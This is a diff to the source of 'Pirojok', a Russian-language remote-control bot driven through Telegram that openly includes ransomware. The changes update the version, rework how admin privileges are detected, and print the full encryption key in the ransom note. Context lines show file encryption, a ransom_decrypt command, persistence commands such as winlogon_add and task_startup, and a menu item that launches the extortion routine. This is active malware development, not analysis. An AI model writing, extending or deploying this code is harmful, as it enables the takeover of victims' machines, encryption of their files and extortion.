@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Пирожок - вкусное блюдо для удаленного управления
-Версия 3.2.3 - С RANSOMWARE И КОМАНДОЙ RANSOM_KEY
+Версия 3.2.4 - СТАБИЛЬНАЯ (исправлено определение прав)
 """
 
 import os
@@ -135,7 +135,7 @@ class PirojokRansomware:
 ║   Всего зашифровано: {len(self.encrypted_files)} файлов      ║
 ║                                                              ║
 ║   Для восстановления файлов используйте ключ:               ║
-║   {key_b64[:64]}                                             ║
+║   {key_b64}                                                  ║
 ║                                                              ║
 ║   Отправьте команду в Telegram:                             ║
 ║   ransom_decrypt {key_b64[:16]}...                           ║
@@ -161,7 +161,7 @@ class PirojokRansomware:
             
             result = f"✅ Зашифровано {len(encrypted)} файлов\n"
             result += f"📝 Записка: {note}\n"
-            result += f"🔑 Ключ: {base64.b64encode(self.encryption_key).decode()[:32]}..."
+            result += f"🔑 Ключ: {base64.b64encode(self.encryption_key).decode()}"
             
             return result
         except Exception as e:
@@ -212,9 +212,9 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "3.2.3"
+        self.version = "3.2.4"
         self.command_timeout = 60
-        self.admin_mode = self.check_admin()
+        self.admin_mode = False  # Сначала False
         self.startup_time = datetime.now()
         
         # Инициализация ransomware
@@ -222,6 +222,10 @@ class Pirojok:
         
         # Создаём файл-маркер для отслеживания запусков
         self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
+        
+        # Проверяем права при запуске
+        self.admin_mode = self.check_admin()
+        print(f"Права при запуске: {'Админ' if self.admin_mode else 'Пользователь'}")
         
     # ========== ПРОВЕРКА ПРАВ ==========
     
@@ -780,8 +784,13 @@ class Pirojok:
         
         print(f"Получена команда: {text}")
         
-        # ВАЖНО: всегда обновляем admin_mode перед проверкой
-        self.admin_mode = self.check_admin()
+        # ПОЛУЧАЕМ АКТУАЛЬНЫЕ ПРАВА
+        current_admin = self.check_admin()
+        
+        # Если права изменились, обновляем
+        if current_admin != self.admin_mode:
+            self.admin_mode = current_admin
+            print(f"Права изменились: {'Админ' if self.admin_mode else 'Пользователь'}")
         
         # Админ-команды
         admin_commands = ["admin_cmd", "winlogon_add", "task_startup", "active_setup", 
@@ -796,7 +805,7 @@ class Pirojok:
         # === HELP / MENU ===
         if text == "help" or text == "menu":
             help_text = """
-🥧 <b>ПИРОЖОК v3.2.3 С RANSOMWARE МЕНЮ:</b>
+🥧 <b>ПИРОЖОК v3.2.4 С RANSOMWARE МЕНЮ:</b>
 
 <b>🔒 RANSOMWARE:</b>
 • ransom / ransom_start - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
